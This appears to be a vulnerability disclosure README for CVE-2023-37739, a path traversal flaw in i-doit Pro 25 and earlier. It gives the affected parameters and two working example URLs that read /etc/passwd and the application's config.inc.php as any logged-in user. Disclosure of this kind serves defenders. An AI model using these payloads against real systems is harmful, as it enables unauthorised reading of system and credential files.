# CVE-2023-37739 - Path Traversal in i-doit Pro 25 and below


i-doit Pro 25 and below are vulnerable to Path Traversal vulnerability. These vulnerabilities could allows remote authenticated attackers (low or high privilege) to navigate to locations that should not be accessible to the user.it can be used to read and or access sensitive files.

Description of product: i-doit is a web based IT documentation and CMDB (Configuration Management Database) developed by synetics GmbH , i-doit Pro is the commercial version of the software and requires a paid license. It comes with additional features, professional support, and regular updates and enhancements. Users need to purchase a license to use i-doit Pro, and the cost varies based on the number of users and features required.


Description of vulnerability: We found that this web application allows any authenticated user to navigate to locations that should not be accessible to the user.it can be used to read and or access sensitive files...



Affected Webpage: /?moduleID and /index.php

Affected Parameter & Component 1  : ?moduleID=2&file_manager=image&file

Affected Parameter & Component 2  : 
?viewMode=1100&objID=56&tvMode=1006&catgID=27&objTypeID=39&editMode=0&objGroupID=2&moduleID=2&file_manager=image&file=

Step 1 : login as any valid user, it can be low privilege or high privilege user. Navigate to below url, edit the ../../../ to the file you wish to read or access.


![step1](https://github.com/leekenghwa/CVE-2023-37739---Path-Traversal-in-i-doit-Pro-25-and-below/assets/45155253/53bc07ac-7652-46e0-96a9-9151bb38e3d6)


example 1: http://IP/?moduleID=2&file_manager=image&file=../../../../../../..//etc/passwd

example 2: http://IP/index.php?viewMode=1100&objID=56&tvMode=1006&catgID=27&objTypeID=39&editMode=0&objGroupID=2&moduleID=2&file_manager=image&file=../../../src/config.inc.php



![step2](https://github.com/leekenghwa/CVE-2023-37739---Path-Traversal-in-i-doit-Pro-25-and-below/assets/45155253/f8edf8f7-574a-45b0-8233-82ff81643e13)



![step3](https://github.com/leekenghwa/CVE-2023-37739---Path-Traversal-in-i-doit-Pro-25-and-below/assets/45155253/a1932132-f306-41e6-b60d-06a49106074e)




![step4](https://github.com/leekenghwa/CVE-2023-37739---Path-Traversal-in-i-doit-Pro-25-and-below/assets/45155253/fe6d1208-3f6f-4b7b-af6a-fcd2cb3caf34)




